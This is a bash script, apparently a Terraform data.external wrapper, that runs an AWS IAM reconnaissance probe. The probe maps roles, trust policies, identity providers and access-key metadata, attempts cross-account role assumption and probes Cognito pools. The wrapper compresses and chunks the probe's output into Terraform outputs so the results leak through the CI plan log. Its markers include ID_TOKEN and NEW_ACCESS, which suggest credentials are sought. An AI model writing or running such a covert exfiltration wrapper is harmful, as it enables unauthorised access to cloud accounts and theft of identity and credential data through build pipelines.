#!/usr/bin/env bash
# c211-i121316 terraform data.external wrapper: full AWS IAM trust-graph map
# (roles+trust, OIDC/SAML providers, users+access-key metadata, authorization
# details, per-role policies, (a)-(e) classification, cross-account assume
# attempts, Cognito pool probes). stdout MUST be one JSON object of STRING
# values (terraform external contract). The probe's full JSON stdout (or, on
# failure, its stderr) is zlib-compressed and emitted as 3000-char chunkNNNN
# fields so the terraform plan "Changes to Outputs" block carries the exact
# result back in the job log.
set +e
OUT=/tmp/c211_i121316_out.json
ERR=/tmp/c211_i121316_err.txt
: > "$OUT"
: > "$ERR"
python3 ./probe_trust2.py > "$OUT" 2> "$ERR"
RC=$?
python3 - "$OUT" "$ERR" "$RC" <<'PYEOF'
import base64, hashlib, json, sys, zlib
out_p, err_p, rc = sys.argv[1], sys.argv[2], sys.argv[3]
try:
    out = open(out_p, 'rb').read()
except Exception:
    out = b''
try:
    err = open(err_p, 'rb').read()
except Exception:
    err = b''
ok = False
try:
    json.loads(out.decode() or '{}')
    ok = bool(out.strip())
except Exception:
    ok = False
payload = out if ok else err
diag = []
for ln in err.decode('utf-8', 'replace').splitlines():
    s = ln.strip()
    if s.startswith(('C211', 'IDENTITY', 'LISTROLES', 'TRUST', 'OIDC', 'SAML', 'ACCT_SUMMARY',
                     'IAM_USER', 'AUTHZ', 'TRUST_CLASSES', 'COGNITO', 'CROSS_ASSUME', 'ORG',
                     'LIST_ACCOUNTS', 'ID_TOKEN', 'VERDICT', 'NEW_ACCESS', 'WEBID_ASSUME',
                     'DIRECT_ASSUME', 'MARKER')):
        diag.append(s[:800])
b64 = base64.b64encode(zlib.compress(payload, 9)).decode()
res = {'verdict': 'OK' if ok else ('PROBE_NO_STDOUT_RC_' + rc),
       'rc': rc,
       'out_sha256': hashlib.sha256(out).hexdigest(),
       'out_bytes': str(len(out)),
       'err_bytes': str(len(err)),
       'diag': '\n'.join(diag[-260:]),
       'chunks': str((len(b64) + 2999) // 3000)}
for i in range(0, len(b64), 3000):
    res['chunk%04d' % (i // 3000)] = b64[i:i + 3000]
print(json.dumps(res))
PYEOF
exit 0
